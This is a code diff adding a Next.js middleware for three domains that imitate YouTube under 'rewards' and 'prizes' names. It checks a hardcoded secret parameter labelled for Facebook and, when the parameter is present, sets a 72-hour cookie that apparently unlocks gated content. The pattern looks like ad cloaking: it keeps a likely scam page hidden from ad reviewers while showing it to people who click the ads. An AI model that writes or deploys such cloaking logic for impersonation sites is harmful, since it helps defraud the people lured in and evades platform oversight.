@@ -1,0 +1,53 @@
+import { NextRequest, NextResponse } from 'next/server';
+
+const FACEBOOK_PARAM_PASS = 'b6mP2e7KIKH7i2w';
+
+const domainMap: Record<string, string> = {
+  "www.youtuberecompensa.online": "1",
+  "www.youtube-rewards.online": "2",
+  "www.youtubepremios.com": "3",
+};
+
+export function middleware(req: NextRequest) {
+  const { nextUrl } = req;
+  const url = nextUrl.toString();
+  const host = nextUrl.hostname.toLowerCase();
+  const searchParams = nextUrl.searchParams;
+
+  const requestHeaders = new Headers(req.headers);
+  requestHeaders.set('x-url', url);
+  requestHeaders.set('x-host', host);
+
+  const domainId = domainMap[host] || "0";
+  requestHeaders.set('x-domain-id', domainId);
+
+  const catParam = searchParams.get('cat');
+
+  if (catParam === FACEBOOK_PARAM_PASS) {
+    searchParams.delete('cat');
+    const newUrl = req.nextUrl.clone();
+    newUrl.search = searchParams.toString();
+  
+    const response = NextResponse.redirect(newUrl, { status: 302 });
+    
+    response.cookies.set({
+      name: 'cat_valid',
+      value: '1',
+      path: '/',
+      maxAge: 60 * 60 * 72,
+      httpOnly: false,
+    });
+  
+    return response;
+  }
+
+  return NextResponse.next({
+    request: {
+      headers: requestHeaders,
+    },
+  });
+}
+
+export const config = {
+  matcher: ["/:path*"],
+};
